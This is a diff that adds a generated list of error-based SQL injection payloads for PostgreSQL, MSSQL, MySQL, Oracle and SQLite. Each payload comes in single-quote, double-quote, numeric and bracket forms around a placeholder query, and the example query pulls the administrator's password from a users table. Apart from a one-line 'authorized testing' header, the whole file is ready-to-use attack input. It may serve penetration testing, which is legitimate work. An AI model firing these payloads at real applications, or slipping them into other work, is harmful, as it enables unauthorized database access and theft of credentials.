@@ -1,0 +1,106 @@
+# ============================================================
+# ERROR-BASED EXTRACTION PAYLOADS (generated)
+# Authorized testing ONLY.
+# {Q} = inner SELECT to leak, e.g. SELECT password FROM users WHERE username='administrator' LIMIT 1
+# Each payload is emitted across single/double/numeric/bracket contexts.
+# ============================================================
+
+## PostgreSQL — CAST to int
+' AND 1=CAST(({Q}) AS int)-- -
+" AND 1=CAST(({Q}) AS int)-- -
+AND 1=CAST(({Q}) AS int)-- -
+') AND 1=CAST(({Q}) AS int)-- -
+' AND 1=CAST(({Q} LIMIT 1) AS int)-- -
+" AND 1=CAST(({Q} LIMIT 1) AS int)-- -
+AND 1=CAST(({Q} LIMIT 1) AS int)-- -
+') AND 1=CAST(({Q} LIMIT 1) AS int)-- -
+' OR 1=CAST(({Q}) AS int)-- -
+" OR 1=CAST(({Q}) AS int)-- -
+OR 1=CAST(({Q}) AS int)-- -
+') OR 1=CAST(({Q}) AS int)-- -
+' AND CAST(({Q}) AS int)=1-- -
+" AND CAST(({Q}) AS int)=1-- -
+AND CAST(({Q}) AS int)=1-- -
+') AND CAST(({Q}) AS int)=1-- -
+' AND 1=(SELECT CAST(({Q}) AS int))-- -
+" AND 1=(SELECT CAST(({Q}) AS int))-- -
+AND 1=(SELECT CAST(({Q}) AS int))-- -
+') AND 1=(SELECT CAST(({Q}) AS int))-- -
+
+## PostgreSQL — CAST to numeric/text-fail
+' AND 1=CAST(({Q}) AS numeric)-- -
+" AND 1=CAST(({Q}) AS numeric)-- -
+AND 1=CAST(({Q}) AS numeric)-- -
+') AND 1=CAST(({Q}) AS numeric)-- -
+' AND 1.0=CAST(({Q}) AS float)-- -
+" AND 1.0=CAST(({Q}) AS float)-- -
+AND 1.0=CAST(({Q}) AS float)-- -
+') AND 1.0=CAST(({Q}) AS float)-- -
+
+## MSSQL — CONVERT/CAST to int
+' AND 1=CONVERT(int,({Q}))-- -
+" AND 1=CONVERT(int,({Q}))-- -
+AND 1=CONVERT(int,({Q}))-- -
+') AND 1=CONVERT(int,({Q}))-- -
+' AND 1=CAST(({Q}) AS int)-- -
+" AND 1=CAST(({Q}) AS int)-- -
+AND 1=CAST(({Q}) AS int)-- -
+') AND 1=CAST(({Q}) AS int)-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 ({Q})))-- -
+" AND 1=CONVERT(int,(SELECT TOP 1 ({Q})))-- -
+AND 1=CONVERT(int,(SELECT TOP 1 ({Q})))-- -
+') AND 1=CONVERT(int,(SELECT TOP 1 ({Q})))-- -
+'+CONVERT(int,({Q}))+'
+"+CONVERT(int,({Q}))+"
+
+## MySQL — extractvalue/updatexml (XPATH error)
+' AND extractvalue(1,concat(0x7e,({Q})))-- -
+" AND extractvalue(1,concat(0x7e,({Q})))-- -
+AND extractvalue(1,concat(0x7e,({Q})))-- -
+') AND extractvalue(1,concat(0x7e,({Q})))-- -
+' AND updatexml(1,concat(0x7e,({Q})),1)-- -
+" AND updatexml(1,concat(0x7e,({Q})),1)-- -
+AND updatexml(1,concat(0x7e,({Q})),1)-- -
+') AND updatexml(1,concat(0x7e,({Q})),1)-- -
+' OR extractvalue(1,concat(0x7e,({Q})))-- -
+" OR extractvalue(1,concat(0x7e,({Q})))-- -
+OR extractvalue(1,concat(0x7e,({Q})))-- -
+') OR extractvalue(1,concat(0x7e,({Q})))-- -
+' AND extractvalue(1,concat(0x7e,substring(({Q}),1,32)))-- -
+" AND extractvalue(1,concat(0x7e,substring(({Q}),1,32)))-- -
+AND extractvalue(1,concat(0x7e,substring(({Q}),1,32)))-- -
+') AND extractvalue(1,concat(0x7e,substring(({Q}),1,32)))-- -
+
+## MySQL — double-query (count/rand/group_by)
+' AND (SELECT 1 FROM(SELECT count(*),concat(({Q}),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+" AND (SELECT 1 FROM(SELECT count(*),concat(({Q}),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+AND (SELECT 1 FROM(SELECT count(*),concat(({Q}),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+') AND (SELECT 1 FROM(SELECT count(*),concat(({Q}),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+## Oracle — CTXSYS / XMLType / dbms errors
+' AND 1=CTXSYS.DRITHSX.SN(1,({Q}))-- -
+" AND 1=CTXSYS.DRITHSX.SN(1,({Q}))-- -
+AND 1=CTXSYS.DRITHSX.SN(1,({Q}))-- -
+') AND 1=CTXSYS.DRITHSX.SN(1,({Q}))-- -
+' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||({Q})||CHR(62))) FROM dual)-- -
+" AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||({Q})||CHR(62))) FROM dual)-- -
+AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||({Q})||CHR(62))) FROM dual)-- -
+') AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||({Q})||CHR(62))) FROM dual)-- -
+' AND 1=UTL_INADDR.get_host_name(({Q}))-- -
+" AND 1=UTL_INADDR.get_host_name(({Q}))-- -
+AND 1=UTL_INADDR.get_host_name(({Q}))-- -
+') AND 1=UTL_INADDR.get_host_name(({Q}))-- -
+' AND 1=CAST(({Q}) AS int)-- -
+" AND 1=CAST(({Q}) AS int)-- -
+AND 1=CAST(({Q}) AS int)-- -
+') AND 1=CAST(({Q}) AS int)-- -
+
+## SQLite — type/abort errors
+' AND 1=CAST(({Q}) AS int)-- -
+" AND 1=CAST(({Q}) AS int)-- -
+AND 1=CAST(({Q}) AS int)-- -
+') AND 1=CAST(({Q}) AS int)-- -
+' AND ({Q}) AND 1=abs(-1)-- -
+" AND ({Q}) AND 1=abs(-1)-- -
+AND ({Q}) AND 1=abs(-1)-- -
+') AND ({Q}) AND 1=abs(-1)-- -
